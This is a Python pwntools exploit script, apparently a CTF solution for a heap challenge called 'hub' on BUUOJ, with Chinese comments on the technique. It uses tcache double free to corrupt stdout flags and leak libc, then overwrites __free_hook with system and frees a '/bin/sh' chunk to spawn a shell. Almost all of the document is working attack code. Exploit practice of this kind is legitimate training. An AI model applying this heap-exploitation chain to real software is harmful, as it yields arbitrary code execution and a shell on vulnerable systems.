# -*- coding:utf-8 -*-
from PwnContext.core import *
binary = './hub'
debug_libc = './libc-2.27.so'
elf = ELF(binary)
libc = ELF(debug_libc)
local = 0

if local == 1 :
    p = remote('node3.buuoj.cn','25559')
else:
    ctx.binary = binary
    ctx.remote_libc = debug_libc
    ctx.debug_remote_libc = True
    p = ctx.start()

def malloc(size):
    p.sendlineafter('>>', '1')
    p.sendafter('stay?', str(size))


def free(index):
    p.sendlineafter('>>', '2')
    p.sendlineafter('want?', str(index))


def write(content):
    p.sendlineafter('>>', '3')
    p.sendlineafter('want?', str(content))
      # 0x602020---stdout
      #利用0x602020为跳板
#change _IO_2_1_stdout_._flags
malloc(0x70)
free(0)
free(0)
malloc(0x70)
write(p64(0x602020))
malloc(0x70)
malloc(0x70)
malloc(0x70)   #malloc 3次是根据得到的fd再去申请一个
write(p64(0xfbad3887))   #0xfbad1800     #Write(p64(0xfbad2887 + 0x1000))    修改flags

#change stderr -> _IO_write_base
malloc(0x10)
free(0)
free(0)
malloc(0x10)
write(p64(0x602040))
malloc(0x10)
malloc(0x10)


write("\x80\x57")  #修改0x602020  单独爆破5   5768   5770  5778
malloc(0x20)
free(0)
free(0)
malloc(0x20)
write(p64(0x602040))
malloc(0x20)
malloc(0x20)
malloc(0x20)
write("\xc8")  #已经修改了IO_write_base指向的位置
result = p.recvn(6)
libc_addr = u64(result) - libc.symbols['_IO_2_1_stdin_']
log.success('libc_addr: ' + hex(libc_addr))


malloc(0x48)
free(0)
free(0)
malloc(0x48)
write(p64(libc_addr + libc.symbols['__free_hook']))
malloc(0x48)
malloc(0x48)
write(p64(libc_addr + libc.symbols['system']))
malloc(0x58)
write('/bin/sh\0')
free(0)
p.interactive()

#利用uaf的特点，先控制一个fastbin(tcache)分配到bss，控制这个bss的fd(stderr)，在根据这个fd去任意地址分配堆块达到任意地址修改的墓地。
#利用double free 修改堆上的一个堆的fd 去指向0x602020，再去申请一个就是利用0x602020原有的地址去申请一个(利用fd)。我们也可以修改0x602020的地址，下次再用同样的方法去任意地址分配
# stderr 标准错误 ，一般用的较少，所有我们可以放心的修改bss上的这个位置。避免使用stdout的位置，造成其他库函数不能正确调用。
#利用stdout 泄露依然有问题。。。。
